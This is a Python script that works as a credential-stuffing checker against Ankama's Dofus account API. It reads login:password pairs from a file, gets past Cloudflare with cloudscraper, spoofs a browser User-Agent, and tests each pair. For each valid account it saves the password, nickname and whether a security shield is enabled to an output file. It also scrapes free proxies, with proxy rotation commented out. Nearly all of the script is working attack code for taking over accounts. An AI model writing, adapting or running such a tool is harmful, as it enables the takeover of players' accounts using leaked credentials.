import requests
import cloudscraper
import json
import sys
import random
from bs4 import BeautifulSoup as bs


def get_proxies():
    url = "https://free-proxy-list.net/"
    soup = bs(scraper.get(url).content, 'html.parser')
    proxies = []

    for row in soup.find("table", attrs={"id": "proxylisttable"}).find_all("tr")[1:]:
        tds = row.find_all("td")
        try:
            ip = tds[0].text.strip()
            port = tds[1].text.strip()
            proxies.append(str(ip) + ":" + str(port))
        except IndexError:
            continue

    return proxies


scraper = cloudscraper.create_scraper()


class AccountInfos:
    id: int = None
    login: str = None
    pwd: str = None
    nickname: str = None
    shield: bool = None
    profil: str = None

    def __init__(self, id: int, login: str, pwd: str, nickname: str, shield: bool):
        self.id = id
        self.login = login
        self.pwd = pwd
        self.nickname = nickname
        self.shield = shield
        self.profil = f'https://account.ankama.com/fr/profil-ankama/{nickname}/dofus'

    def toJson(self) -> str:
        return json.dumps({
            'id': self.id,
            'login': self.login,
            "password": self.pwd,
            "nickname": self.nickname,
            "shield": self.shield,
            "link": self.profil
        }, indent=4)


def createApiKey(login:  str, pwd: str) -> str:
    """ Retrieve api key session """
    # proxy = proxies[random.randrange(0, len(proxies) - 1)]
    response = scraper.post("https://haapi.ankama.com/json/Ankama/v2/Api/CreateApiKey",
                            data={"login":  login, "password": pwd, "long_life_token": False})

    if response.status_code != 200:
        if response.status_code == 429:
            return "temp_banned"
        return None

    return json.loads(response.text)["key"]


def getAccInfos(login: str, pwd: str) -> AccountInfos:
    key = createApiKey(login, pwd)

    if key == "temp_banned":
        print(f"Program at [{login} | {pwd}] -> ip temporarily banned.")
        sys.exit()

    if key == None:
        return None
    # proxy = proxies[random.randrange(0, len(proxies) - 1)]
    resp = scraper.get(
        "https://haapi.ankama.com/json/Ankama/v2/Account/Account", headers={
            'Host': 'haapi.ankama.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Connection': 'keep-alive',
            'apikey': key
        })

    if resp.status_code != 200:
        raise Exception(f'Error getAccInfos : {resp.text}')

    data = json.loads(resp.text)
    return AccountInfos(data["id"], data["login"], pwd, data["nickname"], len(data["security"]) != 0)


def printProgressBar(iteration, total, prefix='', suffix='', decimals=1, length=100, fill='█', printEnd="\r"):
    """
    Call in a loop to create terminal progress bar
    @params:
        iteration   - Required  : current iteration (Int)
        total       - Required  : total iterations (Int)
        prefix      - Optional  : prefix string (Str)
        suffix      - Optional  : suffix string (Str)
        decimals    - Optional  : positive number of decimals in percent complete (Int)
        length      - Optional  : character length of bar (Int)
        fill        - Optional  : bar fill character (Str)
        printEnd    - Optional  : end character (e.g. "\r", "\r\n") (Str)
    """
    percent = ("{0:." + str(decimals) + "f}").format(100 *
                                                     (iteration / float(total)))
    filledLength = int(length * iteration // total)
    bar = fill * filledLength + '-' * (length - filledLength)
    print(f'\r{prefix} |{bar}| {percent}% {suffix}', end=printEnd)
    # Print New Line on Complete
    if iteration == total:
        print()


def main():
    output = open("output.txt", "a")
    environnement_new_line = '\n'
    counter: int = 0

    with open("accounts.txt", "r") as input:
        accounts = input.readlines()
        length = len(accounts)
        printProgressBar(0, length, prefix='Progress:', suffix='Complete')
        for i, account in enumerate(accounts):
            credentials = account.replace('\n', '').split(":")
            acc = getAccInfos(credentials[0], credentials[1])

            if acc != None:
                output.write(f"{acc.toJson()}{environnement_new_line}\n")
                counter += 1
            printProgressBar(i+1, length, prefix='Progress', suffix='Complete')

    print(f'{counter} account(s) found.')
    output.close()
